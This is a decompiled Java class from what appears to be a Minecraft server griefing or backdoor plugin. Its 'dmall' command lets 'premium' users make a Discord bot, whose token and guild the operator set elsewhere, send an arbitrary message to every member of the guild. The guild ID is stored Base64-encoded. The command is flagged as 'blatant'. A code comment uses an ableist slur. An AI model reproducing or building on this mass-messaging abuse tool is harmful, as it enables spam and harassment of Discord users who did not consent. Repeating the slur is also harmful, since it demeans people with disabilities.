/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium.bot;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import java.util.Base64;

import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.PrivateChannel;
import org.bukkit.entity.Player;

public class DmallCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            if (plugin.botEnabled) {
                byte[] u2 = Base64.getDecoder().decode(DataManager.getData().getString("id"));
                Guild guild = plugin.jda.getGuildById(new String(u2));
                if (guild == null) {
                    p2.sendMessage(Settings.PREFIX("The bot doesn't seem to be in the guild set! Use setguild"));
                } else if (args.length <= 1) {
                    p2.sendMessage(Settings.PREFIX("Enter a message to DM all users"));
                } else {
                    StringBuilder chat = new StringBuilder();
                    for (int i2 = 1; i2 != args.length; ++i2) {
                        chat.append(args[i2]).append(" ");
                    }
                    String delegate = chat.toString();
                    guild.getMembers().forEach(c2 -> {
                        if (false) {
                            // Dont know what this for ?!?
                            // and final thing noot is retarded
                            return;
                        }
                        PrivateChannel channel = c2.getUser().openPrivateChannel().complete();
                        channel.sendMessage(delegate).complete();
                    });
                    p2.sendMessage(Settings.PREFIX("All users received a DM saying " + Settings.RED + chat));
                }
            } else {
                p2.sendMessage(Settings.PREFIX("The bot doesn't seem to be logged in! Use settoken"));
            }
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

